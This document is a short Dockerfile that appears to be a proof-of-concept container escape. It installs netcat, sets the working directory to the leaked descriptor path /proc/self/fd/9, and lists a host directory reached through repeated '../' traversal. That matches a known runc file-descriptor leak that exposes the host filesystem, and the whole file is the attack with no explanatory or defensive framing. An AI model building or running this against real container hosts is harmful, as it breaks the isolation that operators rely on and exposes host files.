FROM ubuntu:20.04
RUN apt-get update -y && apt-get install netcat -y
 WORKDIR /proc/self/fd/9
CMD ["bash", "-c", "ls ../../../../../houdini/tricks/HostMount"]